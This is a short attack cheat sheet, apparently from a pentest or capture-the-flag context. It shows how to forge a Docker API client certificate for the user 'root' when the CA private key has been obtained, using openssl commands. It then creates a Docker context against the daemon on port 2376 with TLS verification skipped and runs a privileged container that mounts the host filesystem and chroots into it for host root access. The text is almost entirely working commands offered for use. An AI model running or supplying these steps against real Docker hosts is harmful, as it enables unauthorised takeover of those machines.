## Forgin certificate

if you have the CA private keys you can forging a certificate that docker api will accept.
First, let's create our config file which we'll use to craft the certificate, Create a file called `root.cnf`

```conf
[ req ]
distinguished_name = req_distinguished_name
prompt = no

[ req_distinguished_name ]
CN = root
```

which here root is the user that docker is going to see
Now let's generate new private key

```bash
openssl genrsa -out key.pem 2048
```

Then we will create the certificate signing request.

```bash
openssl req -new -key key.pem -out root.csr -config root.cnf
```

And finally sign the key with the CA private key

```bash
openssl x509 -req -in root.csr \
  -CA ca.pem -CAkey ca-key.pem -CAcreateserial \
  -out cert.pem -days 365 -sha256
```

## Create context

```bash
docker context create fries --docker host=tcp://127.0.0.1:2376 --docker ca=ca.pem --docker cert=cert.pem --docker key=key.pem --docker skip-tls-verify=true
```

```bash
docker context use fries
```

```bash
docker run -it --rm --privileged --net=host --pid=host -v /:/mnt [image] \
bash -c "chroot /mnt /bin/bash || chroot /mnt /bin/sh"
```
